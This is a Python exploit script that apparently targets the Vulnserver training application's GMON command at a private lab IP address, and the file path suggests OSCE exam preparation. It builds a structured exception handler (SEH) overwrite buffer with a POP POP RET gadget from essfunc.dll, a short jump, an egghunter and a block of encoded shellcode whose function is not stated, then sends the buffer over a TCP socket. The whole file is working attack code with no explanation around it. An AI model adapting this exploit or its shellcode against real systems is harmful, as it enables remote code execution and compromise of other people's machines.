#!/usr/bin/python
import socket,sys,os,struct

'''
found in C:\Users\n0bfu\Desktop\OSCE_Prep\essfunc.dll
625010B4   5B               POP EBX
625010B5   5D               POP EBP
625010B6   C3               RETN

# offset for SEH overwrite = 3519
'''

buf_totlen = 5005

payload = ("DNWPDNWP" + 
"\xd9\xe8\xd9\x74\x24\xf4\xba\x72\xd1\x91\xc3\x5b\x31\xc9\xb1"
"\x52\x31\x53\x17\x83\xc3\x04\x03\x21\xc2\x73\x36\x39\x0c\xf1"
"\xb9\xc1\xcd\x96\x30\x24\xfc\x96\x27\x2d\xaf\x26\x23\x63\x5c"
"\xcc\x61\x97\xd7\xa0\xad\x98\x50\x0e\x88\x97\x61\x23\xe8\xb6"
"\xe1\x3e\x3d\x18\xdb\xf0\x30\x59\x1c\xec\xb9\x0b\xf5\x7a\x6f"
"\xbb\x72\x36\xac\x30\xc8\xd6\xb4\xa5\x99\xd9\x95\x78\x91\x83"
"\x35\x7b\x76\xb8\x7f\x63\x9b\x85\x36\x18\x6f\x71\xc9\xc8\xa1"
"\x7a\x66\x35\x0e\x89\x76\x72\xa9\x72\x0d\x8a\xc9\x0f\x16\x49"
"\xb3\xcb\x93\x49\x13\x9f\x04\xb5\xa5\x4c\xd2\x3e\xa9\x39\x90"
"\x18\xae\xbc\x75\x13\xca\x35\x78\xf3\x5a\x0d\x5f\xd7\x07\xd5"
"\xfe\x4e\xe2\xb8\xff\x90\x4d\x64\x5a\xdb\x60\x71\xd7\x86\xec"
"\xb6\xda\x38\xed\xd0\x6d\x4b\xdf\x7f\xc6\xc3\x53\xf7\xc0\x14"
"\x93\x22\xb4\x8a\x6a\xcd\xc5\x83\xa8\x99\x95\xbb\x19\xa2\x7d"
"\x3b\xa5\x77\xd1\x6b\x09\x28\x92\xdb\xe9\x98\x7a\x31\xe6\xc7"
"\x9b\x3a\x2c\x60\x31\xc1\xa7\x4f\x6e\xc3\x3d\x38\x6d\xd3\x40"
"\x03\xf8\x35\x28\x63\xad\xee\xc5\x1a\xf4\x64\x77\xe2\x22\x01"
"\xb7\x68\xc1\xf6\x76\x99\xac\xe4\xef\x69\xfb\x56\xb9\x76\xd1"
"\xfe\x25\xe4\xbe\xfe\x20\x15\x69\xa9\x65\xeb\x60\x3f\x98\x52"
"\xdb\x5d\x61\x02\x24\xe5\xbe\xf7\xab\xe4\x33\x43\x88\xf6\x8d"
"\x4c\x94\xa2\x41\x1b\x42\x1c\x24\xf5\x24\xf6\xfe\xaa\xee\x9e"
"\x87\x80\x30\xd8\x87\xcc\xc6\x04\x39\xb9\x9e\x3b\xf6\x2d\x17"
"\x44\xea\xcd\xd8\x9f\xae\xfe\x92\xbd\x87\x96\x7a\x54\x9a\xfa"
"\x7c\x83\xd9\x02\xff\x21\xa2\xf0\x1f\x40\xa7\xbd\xa7\xb9\xd5"
"\xae\x4d\xbd\x4a\xce\x47")

nseh = "\x71\x09\x70\x07"
seh = struct.pack("<I", 0x625010B4)
egg = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2e\x3C\x05\x5A\x74\xEF\xB8\x44\x4E\x57\x50\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

#buffer = "A" * 3515
buffer = "A" * 2515 # -1000 for payload
buffer += payload
buffer += "\x90" * (3515 - len(buffer))
buffer += nseh
buffer += seh
buffer += "\x90" * 12 + egg
buffer += "D" * (buf_totlen - len(buffer))

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("192.168.10.30", 9999))
s.send("GMON /.:/" + buffer + "\r\n")
s.close()

